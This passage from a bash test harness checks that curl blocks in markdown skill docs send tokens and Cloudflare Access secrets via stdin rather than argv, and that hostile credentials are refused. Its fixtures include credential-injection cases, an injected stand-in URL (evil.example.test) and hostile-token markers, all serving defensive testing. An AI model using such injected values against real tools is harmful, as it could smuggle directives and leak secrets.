S7X_PYDIR="$(dirname "$(type -P python3)")"
# s7x_block <file> <marker>... -> the ONE fenced block of that file holding `--config -` and every marker (a count other than 1 is a failure, never a pass)
s7x_block() {
  python3 -I -c '
import sys
f, marks = sys.argv[1], sys.argv[2:]
blocks, cur = [], None
for l in open(f, encoding="utf-8").read().split("\n"):
    if l.strip().startswith("```"):
        if cur is None: cur = []
        else: blocks.append("\n".join(cur)); cur = None
        continue
    if cur is not None: cur.append(l)
hit = [b for b in blocks if "--config -" in b and all(m in b for m in marks)]
if len(hit) != 1: sys.exit(3)
print(hit[0])
' "$REPO_ROOT/$1" "${@:2}"
}
# s7x_run <row> <block file> [secret NAME made bad]: runs the block under bash in a scrubbed environment; sets S7X_RC, S7X_OUT (stdout+stderr), S7X_N (curl calls), S7X_REC
S7X_RC=0; S7X_OUT=""; S7X_N=0; S7X_REC=""
s7x_run() {
  S7X_REC="$S7_X/rec-$1"; assert_fixture_dir "$S7X_REC"; rm -rf "$S7X_REC"; mkdir -p "$S7X_REC"
  S7X_RC=0; S7X_OUT="$(cd "$S7_X" && env -i PATH="$S7_X/bin:$S7X_PYDIR:/usr/bin:/bin" HOME="$S7_X" S7X_REC="$S7X_REC" S7X_TOKEN="$S7X_GOOD" S7X_BADNAME="${3:-}" bash "$2" < /dev/null 2>&1)" || S7X_RC=$?
  S7X_N=0; [[ -r "$S7X_REC/n" ]] && read -r S7X_N < "$S7X_REC/n"; return 0
}
# s7x_argv_has <needle>: 0 when any recorded argv holds the needle
s7x_argv_has() { local i; for ((i = 1; i <= S7X_N; i++)); do grep -qF -- "$1" "$S7X_REC/argv.$i" && return 0; done; return 1; }
# s7x_good <expected stdin config> <secret>...: reasons (empty = good) for a run on a GOOD token: rc 0, exactly one call, no secret on argv, the config on stdin
s7x_good() {
  local want="$1" r="" nd got; shift
  [[ "$S7X_RC" -eq 0 ]] || r+=" rc=$S7X_RC"
  [[ "$S7X_N" -eq 1 ]] || r+=" calls=$S7X_N"
  for nd in "$@"; do ! s7x_argv_has "$nd" || r+=" argv-has-secret"; done
  got=""; [[ -r "$S7X_REC/stdin.1" ]] && got="$(< "$S7X_REC/stdin.1")"
  [[ "$got" == "$want" ]] || r+=" stdin-differs"
  printf '%s' "${r# }"
}
S7X_PM="$S7_X/blk-pm.sh"; S7X_PF="$S7_X/blk-pf.sh"; S7X_SH="$S7_X/blk-sh.sh"; S7X_DS="$S7_X/blk-ds.sh"
s7x_block plugins/soleur/skills/postmerge/references/deploy-status-debugging.md "hooks/deploy-status" > "$S7X_DS" || { rm -f "$S7X_DS"; }
s7x_block plugins/soleur/skills/postmerge/SKILL.md "monitors/" > "$S7X_PM" || { rm -f "$S7X_PM"; }
s7x_block plugins/soleur/skills/preflight/SKILL.md "rest/v1/" > "$S7X_PF" || { rm -f "$S7X_PF"; }
s7x_block plugins/soleur/skills/ship/SKILL.md "infra-config-status" > "$S7X_SH" || { rm -f "$S7X_SH"; }

# postmerge Phase 3.5 (advisory): good token -> one call, token on stdin only; a refused token -> ZERO calls, a SKIPPED line, exit 0
S7X_BAD_REASONS=""
if [[ -s "$S7X_PM" ]]; then
  s7x_run pm-good "$S7X_PM"; S7X_R1="$(s7x_good "header = \"Authorization: Bearer $S7X_GOOD-SENTRY_AUTH_TOKEN\"" "$S7X_GOOD")"; [[ -z "$S7X_R1" ]] || S7X_BAD_REASONS+=" good:$S7X_R1"
  s7x_run pm-bad "$S7X_PM" SENTRY_AUTH_TOKEN
  [[ "$S7X_N" -eq 0 ]] || S7X_BAD_REASONS+=" refused-made-$S7X_N-calls"
  [[ "$S7X_RC" -eq 0 && "$S7X_OUT" == *"SKIPPED"* && "$S7X_OUT" == *"SENTRY_TOKEN"* && "$S7X_OUT" != *"$S7X_BAD"* ]] || S7X_BAD_REASONS+=" refused-not-a-named-skip(rc=$S7X_RC)"
else S7X_BAD_REASONS+=" block-not-found-exactly-once"; fi
if [[ -z "$S7X_BAD_REASONS" ]]; then row "S7 executed (postmerge Phase 3.5): the block run under bash puts the token on curl's stdin config only (none on the recorded argv, exactly one call, so the control saw a call), and a token with a space in it makes zero calls, prints a SKIPPED line naming the variable and exits 0 (advisory phase)" ok
else row "S7 executed (postmerge Phase 3.5): the converted block does not behave as documented" fail "reasons='${S7X_BAD_REASONS# }'"; fi

# preflight Step 1.4: the block is self-sufficient in ONE call (it fetches its own URL and key), sends both headers on stdin, refuses a bad key with zero calls and a message naming the variable
S7X_BAD_REASONS=""
if [[ -s "$S7X_PF" ]]; then
  s7x_run pf-good "$S7X_PF"
  S7X_R1="$(s7x_good "$(printf 'header = "apikey: %s"\nheader = "Authorization: Bearer %s"' "$S7X_GOOD-SUPABASE_SERVICE_ROLE_KEY" "$S7X_GOOD-SUPABASE_SERVICE_ROLE_KEY")" "$S7X_GOOD")"; [[ -z "$S7X_R1" ]] || S7X_BAD_REASONS+=" good:$S7X_R1"
  s7x_argv_has "https://sup.example.invalid/rest/v1/" || S7X_BAD_REASONS+=" url-not-fetched-in-block"
  s7x_run pf-bad "$S7X_PF" SUPABASE_SERVICE_ROLE_KEY
  [[ "$S7X_N" -eq 0 ]] || S7X_BAD_REASONS+=" refused-made-$S7X_N-calls"
  [[ "$S7X_RC" -ne 0 && "$S7X_OUT" == *"SERVICE_ROLE_KEY unset or not"* && "$S7X_OUT" != *"$S7X_BAD"* ]] || S7X_BAD_REASONS+=" refused-message(rc=$S7X_RC)"
else S7X_BAD_REASONS+=" block-not-found-exactly-once"; fi
if [[ -z "$S7X_BAD_REASONS" ]]; then row "S7 executed (preflight Step 1.4): the block run under bash in one call fetches its own URL and key, sends both headers on curl's stdin config only, and a key with a space makes zero calls and a nonzero exit naming SERVICE_ROLE_KEY" ok
else row "S7 executed (preflight Step 1.4): the converted block does not behave as documented" fail "reasons='${S7X_BAD_REASONS# }'"; fi

# ship infra-config-status: the signature and the Access pair (the Rule E names) all ride stdin; any one of them refused -> zero calls
S7X_BAD_REASONS=""
if [[ -s "$S7X_SH" ]]; then
  s7x_run sh-good "$S7X_SH"
  S7X_SIG=""; [[ -r "$S7X_REC/stdin.1" ]] && S7X_SIG="$(sed -n '1s/^header = "X-Signature-256: sha256=\([0-9a-f]\{64\}\)"$/\1/p' "$S7X_REC/stdin.1")"
  S7X_R1="$(s7x_good "$(printf 'header = "X-Signature-256: sha256=%s"\nheader = "CF-Access-Client-Id: %s"\nheader = "CF-Access-Client-Secret: %s"' "$S7X_SIG" "$S7X_GOOD-CF_ACCESS_CLIENT_ID" "$S7X_GOOD-CF_ACCESS_CLIENT_SECRET")" "$S7X_GOOD" "$S7X_SIG")"
  [[ -z "$S7X_R1" && -n "$S7X_SIG" ]] || S7X_BAD_REASONS+=" good:${S7X_R1:-no-signature-line}"
  for S7X_NM in CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET APP_DOMAIN_BASE; do
    s7x_run "sh-bad-$S7X_NM" "$S7X_SH" "$S7X_NM"
    S7X_VAR="${S7X_NM/CF_ACCESS_CLIENT_/CF_ACCESS_}"
    [[ "$S7X_N" -eq 0 ]] || S7X_BAD_REASONS+=" $S7X_NM-refused-made-$S7X_N-calls"
    [[ "$S7X_RC" -ne 0 && "$S7X_OUT" == *"$S7X_VAR unset or not [A-Za-z0-9._~+/=-]"* && "$S7X_OUT" != *"$S7X_BAD"* ]] || S7X_BAD_REASONS+=" $S7X_NM-refused-message-not-naming-$S7X_VAR(rc=$S7X_RC)"
  done
else S7X_BAD_REASONS+=" block-not-found-exactly-once"; fi
if [[ -z "$S7X_BAD_REASONS" ]]; then row "S7 executed (ship infra-config-status): the block run under bash sends X-Signature-256, CF-Access-Client-Id and CF-Access-Client-Secret on curl's stdin config only (none on the recorded argv), and a refused Access id or secret (each made bad alone) makes zero calls and a nonzero exit" ok
else row "S7 executed (ship infra-config-status): the converted block does not behave as documented" fail "reasons='${S7X_BAD_REASONS# }'"; fi

# postmerge deploy-status-debugging: the signature and the Access pair ride stdin, and a refused id or secret (each alone) makes zero calls and names that variable
S7X_BAD_REASONS=""
if [[ -s "$S7X_DS" ]]; then
  s7x_run ds-good "$S7X_DS"
  S7X_SIG=""; [[ -r "$S7X_REC/stdin.1" ]] && S7X_SIG="$(sed -n '1s/^header = "X-Signature-256: sha256=\([0-9a-f]\{64\}\)"$/\1/p' "$S7X_REC/stdin.1")"
  S7X_R1="$(s7x_good "$(printf 'header = "X-Signature-256: sha256=%s"\nheader = "CF-Access-Client-Id: %s"\nheader = "CF-Access-Client-Secret: %s"' "$S7X_SIG" "$S7X_GOOD-CF_ACCESS_CLIENT_ID" "$S7X_GOOD-CF_ACCESS_CLIENT_SECRET")" "$S7X_GOOD" "$S7X_SIG")"
  [[ -z "$S7X_R1" && -n "$S7X_SIG" ]] || S7X_BAD_REASONS+=" good:${S7X_R1:-no-signature-line}"
  s7x_argv_has "https://deploy.soleur.ai/hooks/deploy-status" || S7X_BAD_REASONS+=" url-not-called"
  for S7X_NM in CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET; do
    s7x_run "ds-bad-$S7X_NM" "$S7X_DS" "$S7X_NM"
    [[ "$S7X_N" -eq 0 ]] || S7X_BAD_REASONS+=" $S7X_NM-refused-made-$S7X_N-calls"
    [[ "$S7X_RC" -ne 0 && "$S7X_OUT" == *"$S7X_NM unset or not [A-Za-z0-9._~+/=-]"* && "$S7X_OUT" != *"$S7X_BAD"* ]] || S7X_BAD_REASONS+=" $S7X_NM-refused-message(rc=$S7X_RC)"
  done
else S7X_BAD_REASONS+=" block-not-found-exactly-once"; fi
if [[ -z "$S7X_BAD_REASONS" ]]; then row "S7 executed (postmerge deploy-status-debugging): the block run under bash sends X-Signature-256, CF-Access-Client-Id and CF-Access-Client-Secret on curl's stdin config only (so a dropped --config - or a swapped id and secret is RED), and a refused Access id or secret makes zero calls and a nonzero exit naming that variable" ok
else row "S7 executed (postmerge deploy-status-debugging): the converted block does not behave as documented" fail "reasons='${S7X_BAD_REASONS# }'"; fi

# CONTROL: the judge must go RED on a block that puts the token on argv, and a block whose shape guard is neutralised must make a call for a refused token
S7X_BAD_REASONS=""
if [[ -s "$S7X_PM" ]]; then
  S7X_BLK="$(< "$S7X_PM")"
  S7X_MUT_ARGV="${S7X_BLK//--config - /-H \"Authorization: Bearer \$SENTRY_TOKEN\" }"
  S7X_G="''|*[!A-Za-z0-9._~+/=-]*"; S7X_Q="''"; S7X_MUT_GUARD="${S7X_BLK//"$S7X_G"/$S7X_Q}"
  [[ "$S7X_MUT_ARGV" != "$S7X_BLK" ]] || S7X_BAD_REASONS+=" argv-mutation-did-not-land"
  [[ "$S7X_MUT_GUARD" != "$S7X_BLK" ]] || S7X_BAD_REASONS+=" guard-mutation-did-not-land"
  printf '%s\n' "$S7X_MUT_ARGV" > "$S7_X/blk-mut-argv.sh"; printf '%s\n' "$S7X_MUT_GUARD" > "$S7_X/blk-mut-guard.sh"
  s7x_run mut-argv "$S7_X/blk-mut-argv.sh"; S7X_R1="$(s7x_good "header = \"Authorization: Bearer $S7X_GOOD-SENTRY_AUTH_TOKEN\"" "$S7X_GOOD")"
  [[ "$S7X_R1" == *argv-has-secret* && "$S7X_R1" == *stdin-differs* ]] || S7X_BAD_REASONS+=" argv-token-not-RED('$S7X_R1')"
  s7x_run mut-guard "$S7_X/blk-mut-guard.sh" SENTRY_AUTH_TOKEN
  [[ "$S7X_N" -ge 1 ]] || S7X_BAD_REASONS+=" neutralised-guard-still-made-no-call"
else S7X_BAD_REASONS+=" block-not-found-exactly-once"; fi
if [[ -z "$S7X_BAD_REASONS" ]]; then row "S7 executed control: the judge is RED when the block puts the token on argv (token on argv, nothing on stdin), and a block with the shape guard neutralised makes a curl call for a refused token (so the zero-call assertions can fail)" ok
else row "S7 executed control: the executed rows cannot go RED" fail "reasons='${S7X_BAD_REASONS# }'"; fi
echo "=== stage S7: Guard 3 rows (markdown bearer headers off curl argv: derived census, residual allowlist, logical-line join, stdin conflict) done ==="

# =====================================================================================
# CONTROLS FOR THE VERDICT-OWNING HELPERS. Every helper that names failed checks (bk_check, bs_refusal, bs_ok_call, hmx_refused, evaluate_hmac,
# evaluate_body) is driven here with a FABRICATED row directory that is green except for exactly ONE doctored fact, and the row requires the helper's
# output to be exactly that one check's name. A clause with several alternatives (a regex `a|b|c`, a loop over values, an `||` of two files) gets one
# variant PER ALTERNATIVE: a control that drives one arm lets the others be deleted unseen (measured at review: the SYNTHMARK0001 arm of the echo test,
# the -sSu bundle and --user= arms of the user-token test, the username in the value test, -macopt, and two of the three config conjuncts all survived). Without this a clause could be deleted from a helper with the whole battery green (measured at review: 39 of 66
# verdict clauses were deletable, the helpers' own clauses being redundant with a sibling on every real row). The un-doctored directory is
# required to come out GREEN first, so a helper that fails everything cannot satisfy a single row. `evaluate` already has this (kind_row).
# =====================================================================================
ctl_dir() { local d="$ROWS/ctl-$1"; assert_fixture_dir "$d"; mkdir -p "$d/shim/calls" "$d/shim/tools"; printf '%s' "$d"; }
ctl_bad=""
ctl_want() { # <label> <got> <want>: records a mismatch in ctl_bad
  [[ "$2" == "$3" ]] || ctl_bad+=" [$1: got '${2:-<empty>}' want '${3:-<empty>}']"
}
ctl_row() { # <label>: one row from ctl_bad
  if [[ -z "$ctl_bad" ]]; then row "$1" ok; else row "$1" fail "$ctl_bad"; fi
  ctl_bad=""
}

# --- bk_check (the backup arm's mask/argv/stdin/body clauses) ---
bkc_mk() { # <variant> -> row name
  local v="$1" d tok="$BK_CANARY"; d="$(ctl_dir "bkc-$v")"; assert_fixture_dir "$d"
  printf '::add-mask::%s\nSHIMCALL 1\nbackup image id=111 ready\n' "$tok" > "$d/out"
  printf 'curl\0--config\0-\0' > "$d/shim/calls/1.argv"
  printf 'header = "Authorization: Bearer %s"\n' "$tok" > "$d/shim/calls/1.stdin"
  case "$v" in
    good) ;;
    mask-not-first)  printf 'preface\n::add-mask::%s\nSHIMCALL 1\n' "$tok" > "$d/out" ;;
    mask-count)      printf '::add-mask::%s\nSHIMCALL 1\nleaked %s\n' "$tok" "$tok" > "$d/out" ;;
    mask-after-curl) printf '::add-mask::%s\nbackup image id=111 ready\n' "$tok" > "$d/out" ;;
    token-in-argv)   printf 'curl\0-H\0Authorization: Bearer %s\0' "$tok" > "$d/shim/calls/1.argv" ;;
    token-not-stdin) printf 'header = "Authorization: Bearer someone-else"\n' > "$d/shim/calls/1.stdin" ;;
    body-in-output)  printf '::add-mask::%s\nSHIMCALL 1\n%s\n' "$tok" "$BK_BODYCANARY" > "$d/out" ;;
  esac
  CTL_NAME="ctl-bkc-$v"
}
for v in good mask-not-first mask-count mask-after-curl token-in-argv token-not-stdin body-in-output; do
  bkc_mk "$v"; bk_check "$CTL_NAME" "$BK_CANARY"
  want="$v"; [[ "$v" == good ]] && want=""
  ctl_want "bk_check/$v" "$BK_FAIL" "$want"
done
ctl_row "bk_check: a green directory is green, and each of its six clauses (mask first, mask once, mask before curl, token in no argv, token on stdin, body not echoed) fails ALONE when only its fact is doctored (including the argv/stdin pair that used to cover each other)"

# --- bs_refusal (the Better Stack reader's refusal contract) ---
bsr_mk() { # <variant> -> row name; sets BS_RC
  local v="$1" d; d="$(ctl_dir "bsr-$v")"; assert_fixture_dir "$d"
  BS_RC=2
  printf 'betterstack-query.sh: refusing to send BETTERSTACK_QUERY_PASSWORD (token_shape)\n%stoken_shape\n' "$BS_MARKER_PFX" > "$d/stderr"
  : > "$d/stdout"
  case "$v" in
    good) ;;
    rc)                   BS_RC=1 ;;
    curl-called)          printf 'curl\0' > "$d/shim/calls/1.argv" ;;
    marker-line)          printf 'betterstack-query.sh: refusing to send BETTERSTACK_QUERY_PASSWORD (token_shape)\n%scontrol_char\n' "$BS_MARKER_PFX" > "$d/stderr" ;;
    marker-count)         printf '%stoken_shape\n' "$BS_MARKER_PFX" > "$d/stdout" ;;
    stderr-lines)         printf 'betterstack-query.sh: refusing to send BETTERSTACK_QUERY_PASSWORD (token_shape)\nan extra line\n%stoken_shape\n' "$BS_MARKER_PFX" > "$d/stderr" ;;
    variable-line)        printf 'betterstack-query.sh: refusing to send a credential (token_shape)\n%stoken_shape\n' "$BS_MARKER_PFX" > "$d/stderr" ;;
    other-variable-named) printf 'betterstack-query.sh: refusing BETTERSTACK_QUERY_PASSWORD and BETTERSTACK_QUERY_USERNAME (token_shape)\n%stoken_shape\n' "$BS_MARKER_PFX" > "$d/stderr" ;;
    value-in-output)      printf '%s\n' "$BS_CAN" > "$d/stdout" ;;
    injected-url-in-output) printf 'http://evil.example.test/second\n' > "$d/stdout" ;;
    unmodelled-flag)      printf 'x\n' > "$d/shim/unmodelled" ;;
  esac
  CTL_NAME="ctl-bsr-$v"
}
for v in good rc curl-called marker-line marker-count stderr-lines variable-line other-variable-named value-in-output injected-url-in-output unmodelled-flag; do
  bsr_mk "$v"; bs_refusal "$CTL_NAME" token_shape BETTERSTACK_QUERY_PASSWORD "$BS_CAN"
  case "$v" in good) want="" ;; rc) want=" rc=1" ;; stderr-lines) want=" stderr-lines=3" ;; *) want=" $v" ;; esac
  ctl_want "bs_refusal/$v" "$BS_BAD" "$want"
done
ctl_row "bs_refusal: a compliant refusal is green, and each of its clauses (exit 2, zero calls, marker line, marker count, two stderr lines, one variable line, the other variable unnamed, value absent, injected URL absent, no unmodelled flag) fails ALONE when only its fact is doctored"

# --- bs_ok_call (the well-formed Better Stack call) ---
bso_mk() { # <variant> -> row name; sets BS_RC
  local v="$1" d; d="$(ctl_dir "bso-$v")"; assert_fixture_dir "$d"
  BS_RC=0
  printf 'curl\0--disable\0--noproxy\0*\0--config\0-\0-d\0%s\0https://%s?query=1\0' "$BS_SQL" "$BS_HOST" > "$d/shim/calls/1.argv"
  printf 'user = "%s"\n' "$BS_PAIR" > "$d/shim/calls/1.stdin"
  printf '%s' "$BS_PAIR" > "$d/shim/calls/1.userpwd"
  : > "$d/stdout"; : > "$d/stderr"
  case "$v" in
    good) ;;
    rc)                BS_RC=1 ;;
    calls)             printf 'curl\0' > "$d/shim/calls/2.argv" ;;
    user-flag)         printf 'flag\n' > "$d/shim/calls/1.userflag" ;;
    injected)          printf 'INJECTED\n' > "$d/shim/calls/1.injected" ;;
    user-token)        printf 'curl\0-u\0%s\0-d\0%s\0https://%s?query=1\0' "x" "$BS_SQL" "$BS_HOST" > "$d/shim/calls/1.argv" ;;
    user-token-bundle) printf 'curl\0-sSu\0%s\0-d\0%s\0https://%s?query=1\0' "x" "$BS_SQL" "$BS_HOST" > "$d/shim/calls/1.argv" ;;
    user-token-digit)  printf 'curl\0-4u\0%s\0-d\0%s\0https://%s?query=1\0' "x" "$BS_SQL" "$BS_HOST" > "$d/shim/calls/1.argv" ;;
    user-token-hash)   printf 'curl\0-#u\0%s\0-d\0%s\0https://%s?query=1\0' "x" "$BS_SQL" "$BS_HOST" > "$d/shim/calls/1.argv" ;;
    user-token-long)   printf 'curl\0--user\0%s\0-d\0%s\0https://%s?query=1\0' "x" "$BS_SQL" "$BS_HOST" > "$d/shim/calls/1.argv" ;;
    user-token-eq)     printf 'curl\0--user=svc:x\0-d\0%s\0https://%s?query=1\0' "$BS_SQL" "$BS_HOST" > "$d/shim/calls/1.argv" ;;
    value-in-argv)     printf 'curl\0-d\0%s\0https://%s?query=1\0%s\0' "$BS_SQL" "$BS_HOST" "arg-$BS_PASS" > "$d/shim/calls/1.argv" ;;
    value-in-argv-user) printf 'curl\0-d\0%s\0https://%s?query=1\0%s\0' "$BS_SQL" "$BS_HOST" "arg-$BS_USER" > "$d/shim/calls/1.argv" ;;
    stdin-shape)       printf 'user = "%s"\n# a second directive\n' "$BS_PAIR" > "$d/shim/calls/1.stdin" ;;
    userpwd)           printf 'someone:else' > "$d/shim/calls/1.userpwd" ;;
    sql)               printf 'curl\0-d\0SELECT 2\0https://%s?query=1\0' "$BS_HOST" > "$d/shim/calls/1.argv" ;;
    url)               printf 'curl\0-d\0%s\0https://elsewhere.example.test/\0' "$BS_SQL" > "$d/shim/calls/1.argv" ;;
    value-in-output)   printf '%s\n' "$BS_PASS" > "$d/stdout" ;;
    marker-on-success) printf 'SOLEUR_CREDENTIAL_REFUSED script=betterstack-query reason=token_shape\n' > "$d/stderr" ;;
    unmodelled-flag)   printf 'x\n' > "$d/shim/unmodelled" ;;
  esac
  CTL_NAME="ctl-bso-$v"
}
for v in good rc calls user-flag injected user-token user-token-bundle user-token-digit user-token-hash user-token-long user-token-eq value-in-argv value-in-argv-user stdin-shape userpwd sql url value-in-output marker-on-success unmodelled-flag; do
  bso_mk "$v"; bs_ok_call "$CTL_NAME"
  case "$v" in
    good) want="" ;; rc) want=" rc=1" ;; calls) want=" calls=2" ;; user-flag) want=" user-flag-in-argv" ;; user-token*) want=" user-token-in-argv" ;; value-in-argv*) want=" value-in-argv" ;;
    stdin-shape) want=" stdin-is-not-exactly-one-user-line" ;; userpwd) want=" userpwd-differs" ;; sql) want=" sql-not-an-argument" ;;
    *) want=" $v" ;;
  esac
  ctl_want "bs_ok_call/$v" "$BS_BAD" "$want"
done
ctl_row "bs_ok_call: a well-formed call is green, and each of its clauses fails ALONE when only its fact is doctored: exit 0, one call, no user flag, no INJECTED, each spelling of the user token (-u, a -sSu bundle, a -4u bundle with a digit, a -#u bundle with the hash, --user, --user=...) and each of the two values (username, password) in argv, exactly one stdin user line, USERPWD equal, SQL an argument, pinned URL, value absent from the output, no marker, no unmodelled flag (the user-line-count clause is unreachable: the exact-stdin clause fails first)"

# --- hmx_refused (every hostile-credential refusal of the canary-promotion, fatal-channel and parity rows) ---
hmr_mk() { # <variant> -> row name; sets RUN_RC
  local v="$1" d; d="$(ctl_dir "hmr-$v")"; assert_fixture_dir "$d"
  RUN_RC=2
  printf 'ctl-surface: refusing a credential\nSOLEUR_CREDENTIAL_REFUSED script=ctl-surface reason=token_shape\n' > "$d/stderr"
  : > "$d/stdout"
  case "$v" in
    good) ;;
    rc)              RUN_RC=1 ;;
    curl-called)     printf 'curl\0' > "$d/shim/calls/1.argv" ;;
    marker-line)     printf 'SOLEUR_CREDENTIAL_REFUSED script=ctl-surface reason=control_char\n' > "$d/stderr" ;;
    marker-count)    printf 'SOLEUR_CREDENTIAL_REFUSED script=ctl-surface reason=token_shape\n' > "$d/stdout" ;;
    value-in-output) printf 'ctl-surface: refusing a credential\nSOLEUR_CREDENTIAL_REFUSED script=ctl-surface reason=token_shape\nid was %s\n' "$HMX_CFID" > "$d/stderr" ;;
    value-in-output-mark)  printf 'ctl-surface: refusing a credential\nSOLEUR_CREDENTIAL_REFUSED script=ctl-surface reason=token_shape\nrejected SYNTHMARK0001x\n' > "$d/stderr" ;;
    value-in-output-key)   printf 'ctl-surface: refusing a credential\nSOLEUR_CREDENTIAL_REFUSED script=ctl-surface reason=token_shape\nkey was %s\n' "$HMX_KEY" > "$d/stderr" ;;
    value-in-output-cfsec) printf 'ctl-surface: refusing a credential\nSOLEUR_CREDENTIAL_REFUSED script=ctl-surface reason=token_shape\nsecret was %s\n' "$HMX_CFSEC" > "$d/stderr" ;;
    value-in-output-stdout) printf 'rejected SYNTHMARK0001x\n' > "$d/stdout" ;;
    stub-called)     printf 'gh\n' > "$d/shim/unexpected" ;;
    stub-unmodelled) printf 'x\n' > "$d/shim/unmodelled" ;;
    bash-error)      printf 'ctl-surface: refusing a credential\nSOLEUR_CREDENTIAL_REFUSED script=ctl-surface reason=token_shape\nctl.sh: line 3: boom: command not found\n' > "$d/stderr" ;;
  esac
  CTL_ROW="$d"
}
for v in good rc curl-called marker-line marker-count value-in-output value-in-output-mark value-in-output-key value-in-output-cfsec value-in-output-stdout stub-called stub-unmodelled bash-error; do
  hmr_mk "$v"; hmx_refused "$CTL_ROW" 2 ctl-surface
  case "$v" in good) want="" ;; rc) want=" rc=1" ;; value-in-output*) want=" value-in-output" ;; stub-*) want=" stub-called" ;; *) want=" $v" ;; esac
  ctl_want "hmx_refused/$v" "$HMX_BAD" "$want"
done
ctl_row "hmx_refused: a compliant refusal is green, and each of its clauses fails ALONE when only its fact is doctored: the rc, zero calls, the marker line, one marker, nothing echoed (EACH alternative of the echo test alone: the SYNTHMARK0001 hostile-token marker, the webhook key, the Cloudflare Access id, the Cloudflare Access secret, and the same marker on stdout rather than stderr), no stub (an unexpected tool and an unmodelled flag each), no bash error"

# --- evaluate_hmac (the full-contract judge of the HMAC probes) ---
EHM_DIG="$(printf '%064d' 7)"
ehm_stdin() { printf 'header = "X-Signature-256: sha256=%s"\nheader = "CF-Access-Client-Id: %s"\nheader = "CF-Access-Client-Secret: %s"\n' "$1" "$2" "$3"; }
ehm_mk() { # <variant> -> row dir
  local v="$1" d; d="$(ctl_dir "ehm-$v")"; assert_fixture_dir "$d"
  printf 'curl\0--config\0-\0' > "$d/shim/calls/1.argv"
  printf 'deploy.soleur.ai' > "$d/shim/calls/1.host"
  ehm_stdin "$EHM_DIG" "$HMX_CFID" "$HMX_CFSEC" > "$d/shim/calls/1.stdin"
  printf 'present\n' > "$d/shim/tools/python3-1.hmackey"
  printf 'python3\0-I\0-c\0program\0' > "$d/shim/tools/python3-1.argv"
  : > "$d/stdout"; : > "$d/stderr"
  case "$v" in
    good|calls-below-min|host) ;;
    stdin-digest)  ehm_stdin "nothex" "$HMX_CFID" "$HMX_CFSEC" > "$d/shim/calls/1.stdin" ;;
    stdin-id)      ehm_stdin "$EHM_DIG" "other-id" "$HMX_CFSEC" > "$d/shim/calls/1.stdin" ;;
    stdin-secret)  ehm_stdin "$EHM_DIG" "$HMX_CFID" "other-secret" > "$d/shim/calls/1.stdin" ;;
    stdin-short)   ehm_stdin "$EHM_DIG" "$HMX_CFID" "$HMX_CFSEC" | head -n 2 > "$d/shim/calls/1.stdin" ;;
    argv-key)      printf 'curl\0%s\0' "$HMX_KEY" > "$d/shim/calls/1.argv" ;;
    argv-id)       printf 'curl\0%s\0' "$HMX_CFID" > "$d/shim/calls/1.argv" ;;
    argv-secret)   printf 'curl\0%s\0' "$HMX_CFSEC" > "$d/shim/calls/1.argv" ;;
    argv-digest)   printf 'curl\0%s\0' "$EHM_DIG" > "$d/shim/calls/1.argv" ;;
    injected)      printf 'INJECTED: line 2\n' > "$d/shim/calls/1.injected" ;;
    tool-key)      printf 'python3\0%s\0' "$HMX_KEY" > "$d/shim/tools/python3-1.argv" ;;
    tool-id)       printf 'python3\0%s\0' "$HMX_CFID" > "$d/shim/tools/python3-1.argv" ;;
    tool-secret)   printf 'python3\0%s\0' "$HMX_CFSEC" > "$d/shim/tools/python3-1.argv" ;;
    tool-hmac)     printf 'openssl\0dgst\0-hmac\0k\0' > "$d/shim/tools/openssl-1.argv" ;;
    tool-macopt)   printf 'openssl\0mac\0-macopt\0hexkey:00\0' > "$d/shim/tools/openssl-1.argv" ;;
    key-not-in-env) rm -f "$d/shim/tools/python3-1.hmackey" ;;
    unexpected-tool) printf 'gh\n' > "$d/shim/unexpected" ;;
    unmodelled-flag) printf 'x\n' > "$d/shim/unmodelled" ;;
    out-key)       printf '%s\n' "$HMX_KEY" > "$d/stdout" ;;
    out-id)        printf '%s\n' "$HMX_CFID" > "$d/stderr" ;;
    out-secret)    printf '%s\n' "$HMX_CFSEC" > "$d/stdout" ;;
    bash-error)    printf 'ctl.sh: line 3: boom: command not found\n' > "$d/stderr" ;;
  esac
  CTL_ROW="$d"
}
for v in good stdin-digest stdin-id stdin-secret stdin-short argv-key argv-id argv-secret argv-digest injected tool-key tool-id tool-secret tool-hmac tool-macopt \
         key-not-in-env calls-below-min host unexpected-tool unmodelled-flag out-key out-id out-secret bash-error; do
  ehm_mk "$v"; min=1; [[ "$v" == calls-below-min ]] && min=2; [[ "$v" == host ]] && min=0
  [[ "$v" == host ]] && printf 'elsewhere.example.test' > "$CTL_ROW/shim/calls/1.host"
  evaluate_hmac "$CTL_ROW" 'deploy\.soleur\.ai' "$min"
  case "$v" in
    good) want="" ;; stdin-*) want="headers-not-on-stdin" ;; argv-*) want="secret-in-argv" ;; tool-*) want="secret-in-tool-argv" ;;
    host) want="unexpected-host" ;; out-*) want="secret-in-output" ;; *) want="$v" ;;
  esac
  ctl_want "evaluate_hmac/$v" "$EV_FAILED" "$want"
done
ctl_row "evaluate_hmac: a compliant row is green, and each of its clauses fails ALONE when only its fact is doctored: three stdin header lines (the digest, the id, the secret and a missing line each), no secret in a curl argv (key, id, secret, digest each) or tool argv (key, id, secret each, and an openssl -hmac operand and an openssl -macopt operand each), HMAC_KEY in python3's environment, the minimum calls, no unexpected host or tool, no INJECTED line, no unmodelled flag, no secret in the output (key, id, secret each), no bash error"

# --- evaluate_body (the JSON-body probes: the body reaches curl on stdin and the password is in no curl or jq argv) ---
# Its `no-calls` clause was the one verdict clause of the family with no control: with zero recorded calls the per-call clauses never run, so a
# row that made no request at all read as GREEN the moment that clause went.
evb_mk() { # <variant> -> row dir
  local v="$1" d; d="$(ctl_dir "evb-$v")"; assert_fixture_dir "$d"; mkdir -p "$d/shim/jq"
  printf 'curl\0--data-binary\0@-\0https://x.example.test/\0' > "$d/shim/calls/1.argv"
  jq -n --arg i "$BODY_ID" --arg p "$BODY_PW" '{identifier:$i,password:$p}' > "$d/shim/calls/1.body"
  printf 'jq\0-n\0{identifier:$ENV.SYNTH_ID_E}\0' > "$d/shim/jq/1.argv"
  case "$v" in
    good) ;;
    no-calls)           rm -f "$d/shim/calls/1.argv" "$d/shim/calls/1.body" ;;
    pw-in-argv)         printf 'curl\0-d\0%s\0' "$BODY_PW" > "$d/shim/calls/1.argv" ;;
    pw-in-jq-argv)      printf 'jq\0--arg\0pw\0%s\0' "$BODY_PW" > "$d/shim/jq/1.argv" ;;
    body-not-recorded)  : > "$d/shim/calls/1.body" ;;
